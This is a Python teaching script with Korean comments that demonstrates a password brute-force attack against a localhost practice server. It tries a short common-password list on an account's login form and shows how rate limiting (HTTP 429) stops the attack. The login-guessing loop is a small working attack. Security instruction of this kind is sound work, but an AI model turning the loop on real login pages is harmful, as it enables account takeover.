"""[공격 실습] 무차별 대입(비밀번호 찍어 맞히기) 시연.

원리: 자주 쓰는 비밀번호 목록을 하나씩 넣어 보고, 맞으면 멈춥니다.
안전장치: 127.0.0.1 / localhost 실습 서버에만 요청을 보낼 수 있습니다.

사용법:
  python attack_bruteforce.py                  # 취약한 서버에서 alice 계정 공격
  python attack_bruteforce.py --target secure  # 보안 서버에서 같은 공격
"""
import argparse
import sys
import time

from attack_sqli import TARGETS, check_local, send

# 자주 쓰이는 비밀번호 목록 (sunshine은 일부러 8번째에 둠)
WORDLIST = [
    "123456", "password", "qwerty", "admin", "letmein",
    "dragon", "monkey", "sunshine", "abc123",
]


def main() -> None:
    parser = argparse.ArgumentParser(description="무차별 대입 실습 (내 실습 서버 전용)")
    parser.add_argument("--target", choices=TARGETS.keys(), default="vulnerable")
    parser.add_argument("--user", default="alice")
    parser.add_argument("--host", default="127.0.0.1")
    args = parser.parse_args()

    base = f"http://{args.host}:{TARGETS[args.target]}"
    check_local(base)
    print(f"🎯 대상: {base}  계정: {args.user}  (목록 {len(WORDLIST)}개)\n")

    for i, guess in enumerate(WORDLIST, start=1):
        status, _ = send(base, "POST", "/login", data={"username": args.user, "password": guess})
        print(f"  {i:>2}번째 시도: {guess:<12} → {status}")

        if status == 200:
            print(f"\n🔓 뚫렸어요! 비밀번호는 '{guess}' 였습니다.")
            print("   교훈: 흔한 비밀번호는 몇 번만 찍어도 들통나요.")
            return
        if status == 429:
            print("\n🛡️ 서버가 잠갔어요. 실패가 너무 많아서 차단됐습니다. 방어 성공!")
            print("   교훈: 실패 횟수 제한이 있으면 무차별 대입이 훨씬 어려워져요.")
            return
        time.sleep(0.05)  # 서버가 힘들지 않게 살짝 쉬기

    print("\n목록을 다 써봤지만 맞히지 못했어요.")
    sys.exit(0)


if __name__ == "__main__":
    main()
